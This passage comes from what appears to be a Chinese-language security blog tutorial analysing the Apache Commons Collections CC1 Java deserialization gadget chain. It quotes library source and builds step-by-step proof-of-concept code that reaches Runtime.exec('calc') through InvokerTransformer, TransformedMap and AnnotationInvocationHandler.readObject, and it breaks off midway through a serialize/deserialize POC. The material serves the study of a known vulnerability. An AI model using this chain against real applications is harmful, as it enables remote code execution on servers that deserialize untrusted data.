class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The method to invoke must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (((paramTypes == <span class="hljs-literal">null</span>) &amp;&amp; (args != <span class="hljs-literal">null</span>))<br>            || ((paramTypes != <span class="hljs-literal">null</span>) &amp;&amp; (args == <span class="hljs-literal">null</span>))<br>            || ((paramTypes != <span class="hljs-literal">null</span>) &amp;&amp; (args != <span class="hljs-literal">null</span>) &amp;&amp; (paramTypes.length != args.length))) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The parameter types must match the arguments&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (paramTypes == <span class="hljs-literal">null</span> || paramTypes.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            paramTypes = (Class[]) paramTypes.clone();<br>            args = (Object[]) args.clone();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName, paramTypes, args);<br>        &#125;<br>    &#125;<br><br> <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = <span class="hljs-literal">null</span>;<br>        iArgs = <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br><br>    <span class="hljs-comment">//实现 Transformer 接口，重写的transform方法，把传入的对象 input 转换成另一个对象</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取传入对象的运行时类</span><br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-comment">//从 cls 类中，反射获取一个方法对象；iMethodName：构造 InvokerTransformer 时传入的目标方法名（可控）；iParamTypes：方法的参数类型数组（可控）</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-comment">//调用上一步拿到的 method，并传入参数 iArgs（可控）</span><br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>                <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>从源码中可知存在反射调用任意类，并且各个参数都是可控的，使用反射调用 Runtime.exec ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-comment">//方法名为exec，参数类型为String，参数值为calc</span><br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>);<br>invokerTransformer.transform(r);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806892.png"></p><h3 id="1-2-分析漏洞链"><a href="#1-2-分析漏洞链" class="headerlink" title="1.2 分析漏洞链"></a>1.2 分析漏洞链</h3><p>现在我们知道了<code>InvokerTransformer.transform()</code> 方法能执行任意命令，但是它自己不会平白无故被调用，必须有别的类&#x2F;方法调用它， 我们就去找哪些类会在正常逻辑中调用 <code>transform</code>**。**如果有哪个类调用了 <code>transform</code>， 就等于找到了一个“入口点”，只要我们能控制传进去的 Transformer，就能让应用在“正常使用 Map”的时候，自动调用到我们的恶意 <code>transform</code> ，从而执行命令 。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806070.png"></p><p>在 <code>TransformedMap</code>类中找到 <code>checkSetValue()</code>方法调用了 <code>transform()</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806968.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span><br>    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractInputCheckedMapDecorator</span><br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">/** Serialization version */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">7023152376788900464L</span>;<br><br>    <span class="hljs-comment">/** The transformer to use for the key */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer keyTransformer;<br>    <span class="hljs-comment">/** The transformer to use for the value */</span><br>    <span class="hljs-comment">//若把 valueTransformer 设为 InvokerTransformer，当它被调用 transform() 时就能执行任意方法/命令</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer valueTransformer;<br><br>    <span class="hljs-comment">//decorate(装饰)，把一个已经存在的 Map 包一层 TransformedMap,以后对这个 Map 做的操作（比如 put），就会先经过 Transformer 处理，再真正存进去</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125;<br><br>    <span class="hljs-comment">//另一种装饰，decorate：包装，不改已有数据；decorateTransform：先改旧数据再包装</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorateTransform</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-type">TransformedMap</span> <span class="hljs-variable">decorated</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>        <span class="hljs-keyword">if</span> (map.size() &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">transformed</span> <span class="hljs-operator">=</span> decorated.transformMap(map);<br>            decorated.clear();<br>            decorated.getMap().putAll(transformed);  <span class="hljs-comment">// avoids double transformation</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> decorated;<br>    &#125;<br><br>    <span class="hljs-comment">//保存底层 map 和两个 transformer;valueTransformer 是我们需要的关键点</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br><br>    <span class="hljs-comment">//自定义序列化，这里的 readObject 并不会主动触发 transformer；它只是把结构恢复</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        out.defaultWriteObject();<br>        out.writeObject(map);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        in.defaultReadObject();<br>        map = (Map) in.readObject();<br>    &#125;<br><br>    <span class="hljs-comment">//若有 keyTransformer 则对 key 做变换；这里的“变换”，在正常情况下是对 key/value 做某种转换（如：大小写转换），但在漏洞利用时，“变换”就执行了攻击者的代码</span><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">transformKey</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">if</span> (keyTransformer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> object;<br>        &#125;<br>        <span class="hljs-keyword">return</span> keyTransformer.transform(object);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">transformValue</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">if</span> (valueTransformer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> object;<br>        &#125;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(object);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Map <span class="hljs-title function_">transformMap</span><span class="hljs-params">(Map map)</span> &#123;<br>        <span class="hljs-keyword">if</span> (map.isEmpty()) &#123;<br>            <span class="hljs-keyword">return</span> map;<br>        &#125;<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedMap</span>(map.size());<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">Iterator</span> <span class="hljs-variable">it</span> <span class="hljs-operator">=</span> map.entrySet().iterator(); it.hasNext(); ) &#123;<br>            Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> (Map.Entry) it.next();<br>            result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">//这里直接调用了 valueTransformer.transform(value)</span><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSetValueChecking</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> (valueTransformer != <span class="hljs-literal">null</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//-----------------------------------------------------------------------</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>        key = transformKey(key);<br>        value = transformValue(value);<br>        <span class="hljs-keyword">return</span> getMap().put(key, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">putAll</span><span class="hljs-params">(Map mapToCopy)</span> &#123;<br>        mapToCopy = transformMap(mapToCopy);<br>        getMap().putAll(mapToCopy);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p> 因为构造函数是 protected，我们不能直接实例化传参，所以找到一个<strong>公共方法 decorate</strong> ，外部调用它就能 new 出一个 TransformedMap 实例， 创建出一个 TransformedMap 对象，并把自己的 Transformer 塞进去，然后通过调用  checkSetValue() 触发 Transformer 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <br><span class="hljs-comment">//用 decorate 包装这个 map</span><br><span class="hljs-comment">//第二个参数 null ：不对 key 做变换</span><br><span class="hljs-comment">//第三个参数 invokerTransformer ：对 value 做变换（关键）</span><br>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer); <br><br></code></pre></td></tr></table></figure><p>接下来找谁调用了 checkSetValue() </p><p><strong>在 AbstractInputCheckedMapDecorator.****<font style="color:#080808;background-color:#ffffff;">MapEntry.setValue() 调用了 checkSetValue() 方法</font></strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806376.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Implementation of a map entry that checks additions via setValue.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">//定义了一个静态内部类 MapEntry，它继承自 AbstractMapEntryDecorator</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapEntryDecorator</span> &#123;<br><br>        <span class="hljs-comment">/** The parent map */</span><br>        <span class="hljs-comment">//声明了一个不可变（final）字段 parent，类型是 AbstractInputCheckedMapDecorator</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;<br><br>        <span class="hljs-comment">//构造器接收两个参数</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;<br>            <span class="hljs-built_in">super</span>(entry);<br>            <span class="hljs-built_in">this</span>.parent = parent;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;<br>            value = parent.checkSetValue(value);<br>            <span class="hljs-keyword">return</span> entry.setValue(value);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>MapEntry</code> 是一个<strong>包装器</strong>，把原始 <code>Map.Entry</code> 包起来，目的就是在 <code>setValue(...)</code> 时插入一次 “由 parent 执行的检查&#x2F;变换”（即调用 <code>parent.checkSetValue(...)</code>）。</li><li>也就是说：任何通过这个包装的 <code>Entry</code> 调用 <code>setValue</code> 的操作，都会先经由 parent 的 <code>checkSetValue</code>，再回到底层 <code>entry</code>。</li></ul><p><strong>当执行 entry.setValue(value) 时，他先调用 checkSetValue(value)，而 checkSetValue(value) 直接调用了  transform 。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <br>map.put(<span class="hljs-string">&quot;gxngxngxn&quot;</span>,<span class="hljs-string">&quot;gxngxngxn&quot;</span>); <span class="hljs-comment">//给map一个键值对，方便遍历</span><br><span class="hljs-comment">//用 decorate 包装这个 map；第二个参数 null ：不对 key 做变换；第三个参数 invokerTransformer ：对 value 做变换（关键）</span><br>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer); <br> <span class="hljs-keyword">for</span>(Map.Entry entry:transformedmap.entrySet()) &#123;<br>         <span class="hljs-comment">//调用 entry.setValue(r)，这里传入的是 Runtime r 对象</span><br>         <span class="hljs-comment">//但是在 MapEntry.setValue 里，会先执行parent.checkSetValue()</span><br>         <span class="hljs-comment">//checkSetValue(value) 内部会执行 return valueTransformer.transform(value);</span><br>         <span class="hljs-comment">//所以传进来的 r 会被 invokerTransformer.transform(r) 处理</span><br>         entry.setValue(r);                       <br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806162.png"></p><p>通过上述测试，说明这条链是能打通的，触发条件是手动遍历了 <code>transformedmap</code>，这不是真正的利用链，接下来要去找 readObject 来触发漏洞。</p><p>同样的，查找哪个方法调用了 setValue ，最好是重写的 readObject 。</p><p>在 AnnotationInvocationHandler 类的 <font style="color:#080808;background-color:#ffffff;">readObject 方法里调用了 setValue 方法</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807086.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        annotationType = AnnotationType.getInstance(type);<br>    &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//获取注解里每个成员的类型（方法名：返回类型）</span><br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>    <span class="hljs-comment">// If there are annotation members without values, that</span><br>    <span class="hljs-comment">// situation is handled by the invoke method.</span><br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>        Class&lt;?&gt; memberType = memberTypes.get(name);<br>        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>            <span class="hljs-comment">//检查当前值是否与成员类型匹配，或者是不是 ExceptionProxy</span><br>            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) || value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                <span class="hljs-comment">//如果不匹配，就调用：memberValue.setValue</span><br>                memberValue.setValue(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                        value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                        annotationType.members().get(name)));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>memberValues 也是可控的</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807528.png"></p><h3 id="1-3-构造-POC-遇到的问题："><a href="#1-3-构造-POC-遇到的问题：" class="headerlink" title="1.3 构造 POC &amp; 遇到的问题："></a>1.3 构造 POC &amp; 遇到的问题：</h3><p>初步构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, transformedMap);<br><br>        <span class="hljs-comment">// 序列化反序列化</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span 